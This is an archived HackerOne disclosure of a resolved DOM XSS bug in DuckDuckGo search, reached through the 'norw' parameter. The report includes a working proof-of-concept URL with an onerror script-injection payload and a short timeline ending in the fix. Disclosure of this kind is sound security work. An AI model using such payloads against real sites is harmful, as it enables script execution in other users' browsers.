---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - vuln/xss
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2020-06-14
submitted: 2020-05-08T11:43:41.859Z
bounty_usd: null
votes: 326
cve: []
program: "[[programs/duckduckgo|DuckDuckGo]]"
reporter: "cujanovic"
source: "https://hackerone.com/reports/868934"
title: "DOM XSS on duckduckgo.com search"
---
# DOM XSS on duckduckgo.com search

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 326 | **Program:** DuckDuckGo | **Disclosed:** 2020-06-14

- Report: [https://hackerone.com/reports/868934](https://hackerone.com/reports/868934)
- CWE: N/A
- Submitted: 2020-05-08T11:43:41.859Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello, 
The is a DOM XSS vulnerability on https://duckduckgo.com search through the ```norw``` parameter.

PoC URL:  ```https://duckduckgo.com/?q=a&norw="><img src=/ onerror=alert(document.domain)>```

Screenshot: {F820482}

## Impact

The attacker can execute JS code.

## Timeline

- **Report Filed**
- **2020-05-08** @0xcain: Hi @cujanovic - I'm discussing this submission internally with the DuckDuckGo team. You will be updated as soon as there is additional information to share. Thanks for your patience!
- **Report Triaged**
- **2020-05-14** @mariag: @cujanovic thanks for the report!
This should be fixed now. Can you confirm?
- **2020-05-14** @cujanovic: @mariag you are welcome!
Yep, it is fixed!
- **Report Resolved**
- **Agreed On Going Public**
- **Swag Awarded**
- **Report Became Public**
